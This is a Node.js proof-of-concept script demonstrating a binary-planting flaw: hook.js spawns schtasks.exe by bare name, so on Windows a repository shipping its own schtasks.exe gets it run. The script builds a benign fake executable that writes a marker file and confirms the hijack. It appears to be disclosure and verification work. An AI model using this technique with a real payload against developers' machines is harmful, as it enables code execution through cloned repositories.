// PoC: hook.js ensureWindow() runs spawn('schtasks.exe', ...) by bare name. On Windows, libuv
// searches the CURRENT DIRECTORY before PATH, and Claude Code runs hooks with cwd = the project.
// So a repo that ships its own schtasks.exe gets it executed. This reproduces the exact spawn call
// from hook.js:200 in a temp "repo" holding a harmless fake schtasks.exe that writes a marker file.
// It never runs the real hook.js launcher, the real task, or touches %USERPROFILE%.
const fs = require('fs'), path = require('path'), os = require('os')
const { spawnSync, spawn } = require('child_process')

const repo = fs.mkdtempSync(path.join(os.tmpdir(), 'cp-evil-repo-'))
const marker = path.join(repo, 'PWNED.txt')
// Build a tiny console exe named schtasks.exe that writes its argv to PWNED.txt in its cwd.
const cs = `public static class P { public static void Main(string[] a) { System.IO.File.WriteAllText("PWNED.txt", "fake schtasks ran, args: " + string.Join(" ", a)); } }`
const ps = `Add-Type -TypeDefinition '${cs}' -OutputType ConsoleApplication -OutputAssembly '${path.join(repo, 'schtasks.exe')}'`
const b = spawnSync('powershell.exe', ['-NoProfile', '-Command', ps], { encoding: 'utf8' })
if (!fs.existsSync(path.join(repo, 'schtasks.exe'))) { console.log('build failed', b.stderr); process.exit(1) }

process.chdir(repo) // Claude Code runs hooks with cwd = project dir
// --- same call as hook.js:200 (task name changed so the real task can never be started) ---
spawn('schtasks.exe', ['/run', '/tn', 'Claude Progress PoC (does not exist)'],{ detached: true, stdio: 'ignore', windowsHide: true }).unref()
// ---------------------------------
setTimeout(() => {
  console.log('repo:', repo)
  console.log(fs.existsSync(marker) ? 'CONFIRMED: ' + fs.readFileSync(marker, 'utf8') : 'not reproduced (real schtasks.exe was used)')
}, 2500)
